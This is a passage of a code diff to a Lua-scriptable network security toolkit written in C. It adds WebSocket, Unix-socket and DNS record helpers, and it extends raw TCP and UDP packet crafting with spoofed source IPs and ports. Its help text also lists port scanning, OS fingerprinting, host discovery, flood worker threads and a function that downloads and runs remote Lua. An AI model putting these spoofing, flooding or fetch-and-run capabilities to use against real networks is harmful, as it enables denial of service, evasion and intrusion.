@@ -29641,6 +29641,7 @@ extern void  user_files_scan(const char *prefix);
 extern void  parse_require_hints(const char *line);
 extern char *G_hints[];
 extern int   G_hints_count;
+extern int   ac_scan_methods(const char *varname, const char *mprefix, char **matches, int max_matches);
 
 static const char *req_mods_list[] = {
     "@std",
@@ -29713,6 +29714,22 @@ static int ac_collect(const char *text, const char *full_line, size_t cursor_pos
         for (int i = 0; req_mods_list[i] && n < max_matches; i++) AC_ADD(req_mods_list[i]);
         for (int i = 0; i < G_dyn_count && n < max_matches; i++) AC_ADD(G_dyn[i]);
         return n;
+    }
+
+    /* ── prefixo de método OO (texto contém ":") ── */
+    {
+        const char *colon_pos = strchr(text, ':');
+        if (colon_pos && colon_pos > text) {
+            char varname[128] = {0};
+            size_t vlen = (size_t)(colon_pos - text);
+            if (vlen < sizeof(varname)) {
+                memcpy(varname, text, vlen);
+                varname[vlen] = '\0';
+                const char *mprefix = colon_pos + 1;
+                n = ac_scan_methods(varname, mprefix, matches, max_matches);
+            }
+            return n;
+        }
     }
 
     /* ── prefixo de módulo (texto contém ".") ── */
@@ -29789,7 +29806,7 @@ void elliot_ac_complete(elliot_repl_state *s, void *ud) {
      * módulo conhecido (tem entries "text.algo" em G_lua), insere "."
      * antes de coletar — igual ao comportamento antigo, para o prefixo
      * comum já sair calculado como "modulo." em vez de "modulo". */
-    if (!strchr(text, '.')) {
+    if (!strchr(text, '.') && !strchr(text, ':')) {
         lua_scan();
         if (tlen > 0 && is_module_name(text, tlen)) {
             elliot_repl_insert_text(s, ".");
@@ -30088,6 +30105,8 @@ ENGINE_EOF
 #include <openssl/sha.h>
 #include <sqlite3.h>
 #include <sys/statvfs.h>
+#include <resolv.h>
+#include <arpa/nameser.h>
 
 /* Forward declarations — evita "implicit function declaration" no clang */
 static int luaopen_net_thread(lua_State *L);
@@ -30332,16 +30351,17 @@ static int elliot_system(const char *cmd) {
     "net.syn(host,port)     — SYN probe → {status,open,ms,ttl}\n" \
     "net.scan(host,p1,p2)   — port scan sem root → tabela de portas\n" \
     "net.ping(host)         — ping → true/false\n" \
-    "net.dns(host[,tipo])   — DNS lookup → tabela de IPs\n" \
+    "net.dns(host[,tipo])   — DNS: A/AAAA/MX/TXT/SRV/NS/PTR/CNAME\n" \
+    "net.unix(path)         — Unix domain socket (AF_UNIX) conectado\n" \
+    "net.ws(url|host,port)  — WebSocket ws:// ou wss:// (URL ou posicional)\n" \
     "net.os(host)           — OS fingerprint → tabela\n" \
     "net.ip([cidr])         — host discovery → tabela de IPs ativos\n" \
     "net.import(url)        — baixa e executa Lua remoto → true/false\n" \
     "\n" \
     "## net.socket — API LuaSocket (sem root)\n" \
-    "socket = net.socket          -- tabela, não é require()\n" \
-    "socket.tcp()                   — cria TCP obj\n" \
-    "socket.tcp4() / socket.tcp6()  — IPv4 / IPv6\n" \
-    "socket.udp()                   — cria UDP obj\n" \
+    "net.socket(proto)              — cria socket pelo protocolo\n" \
+    "  proto: \"tcp\" | \"tcp4\" | \"tcp6\" | \"udp\"  (maiúsculo aceito)\n" \
+    "  ex: local s = net.socket(\"tcp\")\n" \
     "t:connect(host,port)           — → 1 ou nil,err\n" \
     "t:bind(addr,port)              — → 1 ou nil,err\n" \
     "t:listen([backlog])            — → 1 ou nil,err\n" \
@@ -30370,9 +30390,9 @@ static int elliot_system(const char *cmd) {
     "net.raw.tcp(ip,port, \"SYN|ACK\")          -- multiplas flags\n" \
     "net.raw.tcp(ip,port, {                   -- controle total:\n" \
     "  flags=\"SYN\",      -- \"SYN\"|\"RST\"|\"FIN\"|\"SYN|ACK\"|\"xmas\"|\"null\"|0x02\n" \
-    "  spoof_ip=\"1.2.3.5\", -- IP de origem spoofado\n" \
+    "  spfip=\"1.2.3.5\", -- IP de origem spoofado\n" \
     "                    --   \"0\" ou 0 = aleatorio → retorna true, ip_usado\n" \
-    "  spoof_port=12345,   -- porta de origem (0 = aleatoria)\n" \
+    "  spfport=12345,   -- porta de origem (0 = aleatoria)\n" \
     "  seq=0xdeadbeef,   -- sequence number (default: aleatorio)\n" \
     "  ack_seq=0,        -- ack number\n" \
     "  window=65535,     -- tamanho da janela TCP\n" \
@@ -30380,8 +30400,8 @@ static int elliot_system(const char *cmd) {
     "  payload=\"dados\",  -- payload apos o header TCP\n" \
     "  timeout=3})       -- timeout em segundos\n" \
     "-- retorno normal:               true ou nil,err\n" \
-    "-- com spoof_ip=0:              true, \"x.x.x.x\"\n" \
-    "-- com spoof_port=0:            true, nil, porta\n" \
+    "-- com spfip=0:              true, \"x.x.x.x\"\n" \
+    "-- com spfport=0:            true, nil, porta\n" \
     "-- com ambos=0:                 true, \"x.x.x.x\", porta\n" \
     "-- Aliases mantidos para compatibilidade:\n" \
     "net.raw.syn(ip,port)    net.raw.rst(ip,port)    net.raw.ack(ip,port)\n" \
@@ -30398,8 +30418,8 @@ static int elliot_system(const char *cmd) {
     "\n" \
     "-- UDP raw com spoof opcional\n" \
     "net.raw.udp(ip,port,data)                  -- basico\n" \
-    "net.raw.udp(ip,port,data, {spoof_ip=\"x\", spoof_port=53, ttl=128})\n" \
-    "-- spoof_ip=\"0\"/0 = aleatorio → retorna true, \"x.x.x.x\"\n" \
+    "net.raw.udp(ip,port,data, {spfip=\"x\", spfport=53, ttl=128})\n" \
+    "-- spfip=\"0\"/0 = aleatorio → retorna true, \"x.x.x.x\"\n" \
     "\n" \
     "-- NOVO: recebe e parseia um pacote raw\n" \
     "net.raw.recv(proto, timeout)               -- proto: \"tcp\"|\"udp\"|\"icmp\"|numero\n" \
@@ -30407,14 +30427,16 @@ static int elliot_system(const char *cmd) {
     "net.raw.recv(\"tcp\", 5, function(p)         -- filtro Lua\n" \
     "  return (p.flags & 0x12) == 0x12          --   so SYN+ACK\n" \
     "end)\n" \
-    "-- retorna tabela com: spoof_ip, dst_ip, ttl, proto, raw\n" \
-    "--   TCP: +spoof_port, dst_port, seq, ack_seq, flags, flags_s, window, payload\n" \
-    "--   UDP: +spoof_port, dst_port, len, payload\n" \
+    "-- retorna tabela com: spfip, dst_ip, ttl, proto, raw\n" \
+    "--   TCP: +spfport, dst_port, seq, ack_seq, flags, flags_s, window, payload\n" \
+    "--   UDP: +spfport, dst_port, len, payload\n" \
     "--  ICMP: +type, code, id, seq, payload\n" \
     "\n" \
     "-- send generico (controle total do pacote)\n" \
     "net.raw.send(ip,proto,data[,t])     -- proto: \"tcp\"|\"udp\"|\"icmp\"|\"raw\"|numero\n" \
-    "net.socket.raw(proto) -- OOP raw: send/recv/settimeout (--sudo)\n" \
+    "net.socket.raw(proto [,opts]) -- OOP raw: send/recv/settimeout (--sudo)\n" \
+    "--   opts: spfip, spfport, ttl, tos, seq, ack_seq, window, urg_ptr,\n" \
+    "--         payload, flags (flags só em modo rawflags: syn/rst/ack/fin/...)\n" \
     "\n" \
     \
     "## CRYPTO (crypto.*)\n" \
@@ -31509,7 +31531,7 @@ static int ai_http_ask(const char *model, const char *system_prompt,
         "ms -","ms --","lpm ","lmod.","scan","xss","sqli","lfi","rce","ssrf","ssti","prototype","pollution",
         "payload","shell","reverse","bind","inject","flood","fuzzing",
         "function","require","local ","net.tcp","sys.sh","net.listen",
-        "net.socket.tcp()","net.socket.udp()","net.raw.syn(","net.raw.icmp(",
+        "net.socket(\"tcp\")" ,"net.socket(\"udp\")" ,"net.raw.syn(","net.raw.icmp(",
         "nexus","recon","portscan","webcheck","hashcrack","learn.lua",
         "script","hash","wordlist","headers","fingerprint","banner",
         NULL
@@ -32174,7 +32196,7 @@ static int l_ai_ask(lua_State *L) {
         "ms -","ms --","lpm ","lmod.","scan","xss","sqli","lfi","rce","ssrf","ssti","prototype","pollution",
         "payload","shell","reverse","bind","exploit","inject","flood","fuzzing",
         "function","require","local ","net.tcp","sys.sh","net.listen","net.http",
-        "net.socket.tcp()","net.socket.udp()","net.raw.syn(","net.raw.icmp(",
+        "net.socket(\"tcp\")" ,"net.socket(\"udp\")" ,"net.raw.syn(","net.raw.icmp(",
         "nexus","recon","portscan","webcheck","hashcrack","learn.lua",
         "script","hash","wordlist","headers","fingerprint","banner",
         NULL
@@ -32313,7 +32335,7 @@ static int l_ai_search(lua_State *L) {
         "ms -","ms --","lpm ","lmod.","scan","xss","sqli","lfi","rce","ssrf","ssti","prototype","pollution",
         "payload","shell","reverse","bind","exploit","inject","flood","fuzzing",
         "function","require","local ","net.tcp","sys.sh","net.listen","net.http",
-        "net.socket.tcp()","net.socket.udp()","net.raw.syn(","net.raw.icmp(",
+        "net.socket(\"tcp\")" ,"net.socket(\"udp\")" ,"net.raw.syn(","net.raw.icmp(",
         NULL
     };
     const char *_sysp = CYN_SYSTEM_PROMPT_CORE;
@@ -35799,6 +35821,15 @@ static void sock_tls_free(SockObj *s) {
     if (s->ssl_ctx) { SSL_CTX_free(s->ssl_ctx); s->ssl_ctx=NULL; }
 }
 
+/* g_net_verbose: thread-local — 1 = imprime [TCP]/[UDP] ao conectar (padrão REPL),
+ * 0 = silencioso (worker threads de flood/scan). Sem race condition: cada thread
+ * tem sua própria cópia; a main thread permanece verbose=1. */
+static _Thread_local int g_net_verbose = 1;
+static int l_net_set_verbose(lua_State *L) {
+    g_net_verbose = lua_toboolean(L, 1);
+    return 0;
+}
+
 // ── Função interna de conexão — núcleo compartilhado ─────────────────────
 static int sock_do_connect(lua_State *L,
     const char *host, int port,
@@ -35947,8 +35978,10 @@ static int sock_do_connect(lua_State *L,
 
     luaL_getmetatable(L, SOCK_META);
     lua_setmetatable(L, -2);
-    /* impressao colorida no REPL -- so em TTY */
-    if (isatty(STDOUT_FILENO)) {
+    /* impressao colorida no REPL -- so em TTY e quando verbose ativo.
+     * g_net_verbose é thread-local: worker threads de flood setam para 0
+     * sem afetar a main thread. */
+    if (isatty(STDOUT_FILENO) && g_net_verbose) {
         struct timespec _t_end; clock_gettime(CLOCK_MONOTONIC,&_t_end);
         double _ms = (_t_end.tv_sec-_t_start.tv_sec)*1000.0
                    + (_t_end.tv_nsec-_t_start.tv_nsec)/1e6;
@@ -36533,7 +36566,7 @@ static int l_net_tls(lua_State *L) {
     s->ssl_ctx = ctx;
     strncpy(s->stype, "tls", 7);
 
-    if (isatty(STDOUT_FILENO))
+    if (isatty(STDOUT_FILENO) && g_net_verbose)
         fprintf(stdout,"\033[1;32m[TLS] %s:%d → connected (%s)\033[0m\n",
                 host, port, SSL_get_cipher(ssl));
     return 1;
@@ -36690,8 +36723,37 @@ ws_err:
 // Uso: local s = net.ws("echo.websocket.org", 80)
 //      s:ws_send("olá")
 //      local msg, op = s:ws_recv()
+static int l_net_wss(lua_State *L); /* forward declaration */
 static int l_net_ws(lua_State *L) {
-    const char *host = luaL_checkstring(L, 1);
+    const char *arg1 = luaL_checkstring(L, 1);
+
+    /* URL mode: net.ws("ws://host[:port][/path]") ou net.ws("wss://...") */
+    if (strncmp(arg1,"ws://",5)==0 || strncmp(arg1,"wss://",6)==0) {
+        int is_wss=(strncmp(arg1,"wss://",6)==0);
+        const char *rest=arg1+(is_wss?6:5);
+        char host[256]={0};
+        int port=is_wss?443:80;
+        char path_buf[1024]; path_buf[0]='/'; path_buf[1]='\0';
+        int timeout=(int)luaL_optinteger(L,2,10);
+        /* separa host:port do /path */
+        const char *slash=strchr(rest,'/');
+        size_t hp_len=slash?(size_t)(slash-rest):strlen(rest);
+        char hostport[280]={0};
+        if (hp_len>=sizeof(hostport)) hp_len=sizeof(hostport)-1;
+        memcpy(hostport,rest,hp_len);
+        char *colon=strrchr(hostport,':');
+        if (colon) { *colon='\0'; port=atoi(colon+1); }
+        strncpy(host,hostport,sizeof(host)-1);
+        if (slash) strncpy(path_buf,slash,sizeof(path_buf)-1);
+        /* reconstrói stack e re-despacha */
+        lua_settop(L,0);
+        lua_pushstring(L,host); lua_pushinteger(L,port);
+        lua_pushstring(L,path_buf); lua_pushinteger(L,timeout);
+        return is_wss ? l_net_wss(L) : l_net_ws(L);
+    }
+
+    /* modo posicional original: net.ws(host, port [, path [, timeout]]) */
+    const char *host = arg1;
     int port         = (int)luaL_checkinteger(L, 2);
     const char *path = luaL_optstring(L, 3, "/");
     int timeout      = (int)luaL_optinteger(L, 4, 10);
@@ -36706,7 +36768,7 @@ static int l_net_ws(lua_State *L) {
         lua_pushstring(L,"ws: handshake falhou"); return 2;
     }
     strncpy(s->stype, "ws", 7);
-    if (isatty(STDOUT_FILENO))
+    if (isatty(STDOUT_FILENO) && g_net_verbose)
         fprintf(stdout,"\033[1;36m[WS] %s:%d%s → connected\033[0m\n", host, port, path);
     return 1;
 }
@@ -36739,7 +36801,7 @@ static int l_net_wss(lua_State *L) {
         lua_pushstring(L,"wss: handshake falhou"); return 2;
     }
     strncpy(s->stype, "wss", 7);
-    if (isatty(STDOUT_FILENO))
+    if (isatty(STDOUT_FILENO) && g_net_verbose)
         fprintf(stdout,"\033[1;32m[WSS] %s:%d%s → connected (%s)\033[0m\n",
                 host, port, path, SSL_get_cipher(s->ssl));
     return 1;
@@ -36994,7 +37056,7 @@ static int l_net_syn(lua_State *L) {
         timeout = (int)luaL_optinteger(L, 3, 5);
         if (lua_gettop(L) >= 4 && lua_isstring(L, 4))
             family = lua_tostring(L, 4);
-        if (verbose == -1) verbose = 1; /* posicional: imprime por padrão (REPL) */
+        if (verbose == -1) verbose = g_net_verbose; /* posicional: respeita verbose thread-local */
     }
 
     if (port <= 0 || port > 65535) {
@@ -37106,9 +37168,16 @@ static int l_net_syn(lua_State *L) {
 #define RTCP_ACK  0x10
 #define RTCP_URG  0x20
 #endif
-/* forward declaration — definição completa está em net.raw abaixo */
+/* forward declarations — definições completas estão em net.raw abaixo */
 static int raw_tcp_send(lua_State *L,
     const char *dst_ip, int dst_port, uint8_t flags, int timeout);
+static int raw_tcp_send_ex(lua_State *L,
+    const char *dst_ip, int dst_port,
+    uint8_t flags, const char *src_ip_s, uint16_t spfport,
+    uint32_t seq, uint32_t ack_seq, uint16_t window,
+    uint8_t ttl, uint8_t tos, uint16_t urg_ptr,
+    const char *payload, size_t plen, int timeout);
+static int raw_parse_flags_ex(const char *s, uint8_t *out, char *errbuf, size_t ebsz);
 #endif /* ELLIOT_ROOT */
 
 #define LSOCK_META       "ElliotOS.LSocket"
@@ -37121,6 +37190,17 @@ typedef struct {
     int     proto;      /* raw: IPPROTO_*; outros: 0 */
     double  timeout;    /* -1 = blocking, 0 = non-blocking, >0 = segundos */
     uint8_t tcp_flags;  /* rawflags: flags TCP pré-configurados */
+    /* ── campos raw extendidos (igual net.raw) ── */
+    char    spfip[INET_ADDRSTRLEN]; /* "" = sem spoof, "0" = aleatório */
+    uint16_t spfport;  /* 0 = aleatório */
+    uint32_t raw_seq;     /* 0 = aleatório */
+    uint32_t raw_ack_seq;
+    uint16_t raw_window;  /* 0 = 64240 */
+    uint8_t  raw_ttl;     /* 0 = 64 */
+    uint8_t  raw_tos;
+    uint16_t raw_urg_ptr;
+    char    *raw_payload;
+    size_t   raw_plen;
 } LSockObj;
 
 /* ── helpers ──────────────────────────────────────────────────────────── */
@@ -37363,7 +37443,19 @@ static int ls_getsockname(lua_State *L) {
 static int ls_tcp_connect(lua_State *L) {
     LSockObj *s = lsock_check(L, 1);
     const char *host = luaL_checkstring(L, 2);
-    int port = (int)luaL_checkinteger(L, 3);
+    int port = (int)luaL_optinteger(L, 3, 0);
+
+    /* Unix domain socket: host é o path, port ignorado */
+    if (strcmp(s->type,"unix")==0) {
+        struct sockaddr_un sa; memset(&sa,0,sizeof(sa));
+        sa.sun_family=AF_UNIX;
+        strncpy(sa.sun_path,host,sizeof(sa.sun_path)-1);
+        if (connect(s->fd,(struct sockaddr*)&sa,sizeof(sa))<0) {
+            lua_pushnil(L); lua_pushstring(L,strerror(errno)); return 2;
+        }
+        lsock_apply_timeout(s);
+        lua_pushinteger(L,1); return 1;
+    }
     struct sockaddr_in sa;
     if (lsock_resolve4(host, port, &sa) < 0) {
         lua_pushnil(L); lua_pushfstring(L,"não resolveu: %s",host); return 2;
@@ -37655,15 +37747,23 @@ static int ls_raw_receivefrom(lua_State *L) {
     return 2;
 }
 
-/* rawflags: sendto(host, port [,timeout]) — monta e envia TCP com flags pré-set */
+/* rawflags: sendto(host, port [,timeout]) — monta e envia TCP com flags pré-set
+ * Suporta todos os campos de net.raw.tcp: spfip, spfport, ttl, tos,
+ * seq, window, payload — configurados via :setraw(opts) ou no construtor.   */
 static int ls_rawflags_sendto(lua_State *L) {
-    LSockObj *s  = lsock_check(L, 1);
+    LSockObj *s      = lsock_check(L, 1);
     const char *host = luaL_checkstring(L, 2);
     int port         = (int)luaL_checkinteger(L, 3);
-    int timeout      = (int)luaL_optinteger(L, 4, (lua_Integer)s->timeout);
+    int timeout      = (int)luaL_optinteger(L, 4, (lua_Integer)(s->timeout > 0 ? s->timeout : 3));
     uint8_t flags    = (s->tcp_flags == 0xFF) ? 0 : s->tcp_flags; /* 0xFF = null scan */
-    close(s->fd); s->fd = -1; /* raw_tcp_send abre seu próprio fd */
-    int r = raw_tcp_send(L, host, port, flags, timeout);
+    const char *sip  = (s->spfip[0] != '\0') ? s->spfip : NULL;
+    close(s->fd); s->fd = -1;
+    int r = raw_tcp_send_ex(L, host, port,
+        flags, sip, s->spfport,
+        s->raw_seq, s->raw_ack_seq, s->raw_window,
+        s->raw_ttl, s->raw_tos, s->raw_urg_ptr,
+        s->raw_payload, s->raw_plen,
+        timeout);
     /* reabre o fd para uso contínuo */
     int fd2 = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (fd2 >= 0) { int v=1; setsockopt(fd2,IPPROTO_IP,IP_HDRINCL,&v,sizeof(v)); }
@@ -37714,6 +37814,71 @@ static int ls_raw_receive(lua_State *L) {
     return 1;
 }
 #endif /* ELLIOT_ROOT */
+
+static void ls_apply_raw_opts(lua_State *L, LSockObj *s, int idx) {
+    if (!lua_istable(L, idx)) return;
+
+#ifdef ELLIOT_ROOT
+    lua_getfield(L, idx, "flags");
+    if (!lua_isnil(L,-1)) {
+        uint8_t f = RTCP_SYN;
+        if (lua_type(L,-1)==LUA_TNUMBER) {
+            f = (uint8_t)lua_tointeger(L,-1);
+        } else {
+            const char *fs = lua_tostring(L,-1);
+            if (fs) raw_parse_flags_ex(fs, &f, NULL, 0);
+        }
+        s->tcp_flags = f;
+    }
+    lua_pop(L,1);
+#endif
+
+    lua_getfield(L, idx, "spfip");
+    if (!lua_isnil(L,-1)) {
+        const char *v = lua_tostring(L,-1);
+        if (v) strncpy(s->spfip, v, INET_ADDRSTRLEN-1);
+    }
+    lua_pop(L,1);
+
+    lua_getfield(L, idx, "spfport");
+    if (!lua_isnil(L,-1)) s->spfport = (uint16_t)lua_tointeger(L,-1);
+    lua_pop(L,1);
+
+    lua_getfield(L, idx, "ttl");
+    if (!lua_isnil(L,-1)) s->raw_ttl = (uint8_t)lua_tointeger(L,-1);
+    lua_pop(L,1);
+
+    lua_getfield(L, idx, "tos");
+    if (!lua_isnil(L,-1)) s->raw_tos = (uint8_t)lua_tointeger(L,-1);
+    lua_pop(L,1);
+
+    lua_getfield(L, idx, "seq");
+    if (!lua_isnil(L,-1)) s->raw_seq = (uint32_t)lua_tointeger(L,-1);
+    lua_pop(L,1);
+
+    lua_getfield(L, idx, "ack_seq");
+    if (!lua_isnil(L,-1)) s->raw_ack_seq = (uint32_t)lua_tointeger(L,-1);
+    lua_pop(L,1);
+
+    lua_getfield(L, idx, "window");
+    if (!lua_isnil(L,-1)) s->raw_window = (uint16_t)lua_tointeger(L,-1);
+    lua_pop(L,1);
+
+    lua_getfield(L, idx, "urg_ptr");
+    if (!lua_isnil(L,-1)) s->raw_urg_ptr = (uint16_t)lua_tointeger(L,-1);
+    lua_pop(L,1);
+
+    lua_getfield(L, idx, "payload");
+    if (!lua_isnil(L,-1)) {
+        size_t pl; const char *pd = lua_tolstring(L,-1,&pl);
+        if (pd && pl > 0) {
+            free(s->raw_payload);
+            s->raw_payload = (char*)malloc(pl);
+            if (s->raw_payload) { memcpy(s->raw_payload,pd,pl); s->raw_plen=pl; }
+        }
+    }
+    lua_pop(L,1);
+}
 
 /* ── __index dispatcher ───────────────────────────────────────────────── */
 
@@ -37791,6 +37956,7 @@ static int ls_tostring(lua_State *L) {
 static int ls_gc(lua_State *L) {
     LSockObj *s = (LSockObj*)luaL_checkudata(L,1,LSOCK_META);
     if (!s->closed && s->fd >= 0) { close(s->fd); s->fd=-1; s->closed=1; }
+    if (s->raw_payload) { free(s->raw_payload); s->raw_payload=NULL; s->raw_plen=0; }
     return 0;
 }
 
@@ -37799,10 +37965,53 @@ static void lsock_register_meta(lua_State *L) {
     lua_pushcfunction(L,ls_index);    lua_setfield(L,-2,"__index");
     lua_pushcfunction(L,ls_gc);       lua_setfield(L,-2,"__gc");
     lua_pushcfunction(L,ls_tostring); lua_setfield(L,-2,"__tostring");
+    {
+        static const char *ac[] = {
+            "close","settimeout","gettimeout","setoption","getoption",
+            "getpeername","getsockname","getfd","setfd","dirty",
+            "connect","bind","listen","accept","shutdown",
+            "send","receive","sendto","receivefrom",
+            "setpeername","setsockname", NULL
+        };
+        lua_newtable(L);
+        for (int _i = 0; ac[_i]; _i++) {
+            lua_pushboolean(L, 1); lua_setfield(L, -2, ac[_i]);
+        }
+        lua_setfield(L, -2, "_elliot_ac");
+    }
     lua_pop(L,1);
 }
 
 /* ── construtores ─────────────────────────────────────────────────────── */
+
+/* net.socket("unix") — cria socket AF_UNIX sem conectar */
+static int l_lsock_unix(lua_State *L) {
+    int fd=socket(AF_UNIX,SOCK_STREAM,0);
+    if (fd<0) { lua_pushnil(L); lua_pushstring(L,strerror(errno)); return 2; }
+    return lsock_new(L,fd,"unix",0);
+}
+
+/* net.unix(path [, timeout]) — cria e conecta socket Unix em uma chamada
+ * ex: local s = net.unix("/var/run/docker.sock") */
+static int l_net_unix(lua_State *L) {
+    const char *path=(const char*)luaL_checkstring(L,1);
+    int timeout=(int)luaL_optinteger(L,2,10);
+    int fd=socket(AF_UNIX,SOCK_STREAM,0);
+    if (fd<0) { lua_pushnil(L); lua_pushstring(L,strerror(errno)); return 2; }
+    struct timeval tv; tv.tv_sec=timeout; tv.tv_usec=0;
+    setsockopt(fd,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
+    setsockopt(fd,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));
+    struct sockaddr_un sa; memset(&sa,0,sizeof(sa));
+    sa.sun_family=AF_UNIX;
+    strncpy(sa.sun_path,path,sizeof(sa.sun_path)-1);
+    if (connect(fd,(struct sockaddr*)&sa,sizeof(sa))<0) {
+        char e[280]; snprintf(e,sizeof(e),"net.unix: %s",strerror(errno));
+        close(fd); lua_pushnil(L); lua_pushstring(L,e); return 2;
+    }
+    if (g_net_verbose && isatty(STDOUT_FILENO))
+        fprintf(stdout,"\033[1;35m[UNIX] %s → connected\033[0m\n",path);
+    return lsock_new(L,fd,"unix",0);
+}
 
 static int l_lsock_tcp(lua_State *L)  {
     int fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
@@ -37826,6 +38035,25 @@ static int l_lsock_udp(lua_State *L) {
     int fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
     if (fd < 0) { lua_pushnil(L); lua_pushstring(L,strerror(errno)); return 2; }
     return lsock_new(L,fd,"udp",0);
+}
+
+/* net.socket(proto) — cria socket pelo nome do protocolo.
+ * net.socket("tcp")  → TCP IPv4   (= net.socket("tcp"))
+ * net.socket("tcp6") → TCP IPv6
+ * net.socket("udp")  → UDP
+ * maiúsculo/minúsculo aceito. */
+static int l_net_socket_new(lua_State *L) {
+    const char *proto = luaL_optstring(L, 1, "tcp");
+    lua_settop(L, 0); /* limpa args — construtores não recebem argumentos */
+    if (strcasecmp(proto,"tcp")==0 || strcasecmp(proto,"tcp4")==0)
+        return l_lsock_tcp(L);
+    if (strcasecmp(proto,"tcp6")==0)
+        return l_lsock_tcp6(L);
+    if (strcasecmp(proto,"udp")==0)
+        return l_lsock_udp(L);
+    if (strcasecmp(proto,"unix")==0)
+        return l_lsock_unix(L);
+    return luaL_error(L, "net.socket: protocolo '%s' desconhecido (use: tcp, tcp6, udp, unix)", proto);
 }
 
 #ifdef ELLIOT_ROOT
@@ -37883,6 +38111,8 @@ static int l_lsock_raw(lua_State *L) {
     strncpy(s->type, is_flags ? "rawflags" : "raw", sizeof(s->type)-1);
     luaL_getmetatable(L, LSOCK_META); lua_setmetatable(L, -2);
     lsock_apply_timeout(s);
+    /* opts opcionais: socket.raw("syn", { spfip="0", ttl=128, ... }) */
+    if (lua_istable(L, 2)) ls_apply_raw_opts(L, s, 2);
     return 1;
 }
 #endif
@@ -38502,45 +38732,104 @@ static int l_net_ping(lua_State *L) {
     snprintf(cmd, sizeof(cmd), "ping -c 1 -W 1 '%s' > /dev/null 2>&1", host);
     lua_pushboolean(L, system(cmd) == 0); return 1;
 }
+/* net.dns(host [, type]) — resolução DNS completa
+ * Tipos: A, AAAA, ANY, MX, TXT, SRV, NS, PTR, CNAME
+ * A/AAAA/ANY   → array de strings com IPs
+ * MX           → array de {priority, exchange}
+ * SRV          → array de {priority, weight, port, target}
+ * TXT          → array de strings
+ * NS/PTR/CNAME → array de strings */
 static int l_net_dns(lua_State *L) {
-    const char *host = luaL_checkstring(L, 1);
-    const char *type_str = luaL_optstring(L, 2, "A"); // A, AAAA, ANY
+    const char *host     = luaL_checkstring(L, 1);
+    const char *type_str = luaL_optstring(L, 2, "A");
 
-    int af = AF_INET;
-    if (strcasecmp(type_str, "AAAA") == 0 || strcasecmp(type_str, "ipv6") == 0)
-        af = AF_INET6;
-    else if (strcasecmp(type_str, "ANY") == 0)
-        af = AF_UNSPEC;
-
-    struct addrinfo hints, *res = NULL;
-    memset(&hints, 0, sizeof(hints));
-    hints.ai_family   = af;
-    hints.ai_socktype = SOCK_STREAM;
-
-    int rc = getaddrinfo(host, NULL, &hints, &res);
-    if (rc != 0) {
-        lua_pushnil(L);
-        lua_pushstring(L, gai_strerror(rc));
-        return 2;
+    /* ── caminho rápido: A / AAAA / ANY via getaddrinfo ── */
+    if (strcasecmp(type_str,"A")==0 || strcasecmp(type_str,"AAAA")==0
+     || strcasecmp(type_str,"ANY")==0 || strcasecmp(type_str,"ipv6")==0) {
+        int af = AF_INET;
+        if (strcasecmp(type_str,"AAAA")==0||strcasecmp(type_str,"ipv6")==0) af=AF_INET6;
+        else if (strcasecmp(type_str,"ANY")==0) af=AF_UNSPEC;
+        struct addrinfo hints, *res=NULL;
+        memset(&hints,0,sizeof(hints));
+        hints.ai_family=af; hints.ai_socktype=SOCK_STREAM;
+        int rc=getaddrinfo(host,NULL,&hints,&res);
+        if (rc!=0) { lua_pushnil(L); lua_pushstring(L,gai_strerror(rc)); return 2; }
+        lua_newtable(L);
+        int idx=1;
+        for (struct addrinfo *r=res;r;r=r->ai_next) {
+            char ip[INET6_ADDRSTRLEN]={0};
+            if (r->ai_family==AF_INET)
+                inet_ntop(AF_INET,&((struct sockaddr_in*)r->ai_addr)->sin_addr,ip,sizeof(ip));
+            else if (r->ai_family==AF_INET6)
+                inet_ntop(AF_INET6,&((struct sockaddr_in6*)r->ai_addr)->sin6_addr,ip,sizeof(ip));
+            if (ip[0]) { lua_pushstring(L,ip); lua_rawseti(L,-2,idx++); }
+        }
+        freeaddrinfo(res);
+        return 1;
     }
+
+    /* ── caminho completo: MX / TXT / SRV / NS / PTR / CNAME via res_query ── */
+    int qtype;
+    if      (strcasecmp(type_str,"MX")==0)    qtype=ns_t_mx;
+    else if (strcasecmp(type_str,"TXT")==0)   qtype=ns_t_txt;
+    else if (strcasecmp(type_str,"SRV")==0)   qtype=ns_t_srv;
+    else if (strcasecmp(type_str,"NS")==0)    qtype=ns_t_ns;
+    else if (strcasecmp(type_str,"PTR")==0)   qtype=ns_t_ptr;
+    else if (strcasecmp(type_str,"CNAME")==0) qtype=ns_t_cname;
+    else { lua_pushnil(L); lua_pushfstring(L,"net.dns: tipo desconhecido '%s'",type_str); return 2; }
+
+    uint8_t buf[4096];
+    int len=res_query(host,ns_c_in,qtype,buf,sizeof(buf));
+    if (len<0) { lua_pushnil(L); lua_pushstring(L,"net.dns: query falhou (NXDOMAIN ou sem servidor)"); return 2; }
+
+    ns_msg msg;
+    if (ns_initparse(buf,len,&msg)<0) { lua_pushnil(L); lua_pushstring(L,"net.dns: parse falhou"); return 2; }
 
     lua_newtable(L);
-    int idx = 1;
-    for (struct addrinfo *r = res; r; r = r->ai_next) {
-        char ip[INET6_ADDRSTRLEN] = {0};
-        if (r->ai_family == AF_INET) {
-            struct sockaddr_in *sa = (struct sockaddr_in *)r->ai_addr;
-            inet_ntop(AF_INET, &sa->sin_addr, ip, sizeof(ip));
-        } else if (r->ai_family == AF_INET6) {
-            struct sockaddr_in6 *sa = (struct sockaddr_in6 *)r->ai_addr;
-            inet_ntop(AF_INET6, &sa->sin6_addr, ip, sizeof(ip));
-        }
-        if (ip[0]) {
-            lua_pushstring(L, ip);
-            lua_rawseti(L, -2, idx++);
+    int idx=1, count=ns_msg_count(msg,ns_s_an);
+    for (int i=0;i<count;i++) {
+        ns_rr rr;
+        if (ns_parserr(&msg,ns_s_an,i,&rr)<0) continue;
+        if (ns_rr_type(rr)!=(ns_type)qtype) continue;
+        const uint8_t *rd=ns_rr_rdata(rr);
+        uint16_t rdlen=ns_rr_rdlen(rr);
+        char name[NS_MAXDNAME]={0};
+
+        if (qtype==ns_t_mx) {
+            uint16_t pref=ntohs(*(uint16_t*)rd);
+            if (ns_name_uncompress(buf,buf+len,rd+2,name,sizeof(name))<0) continue;
+            lua_newtable(L);
+            lua_pushinteger(L,pref);    lua_setfield(L,-2,"priority");
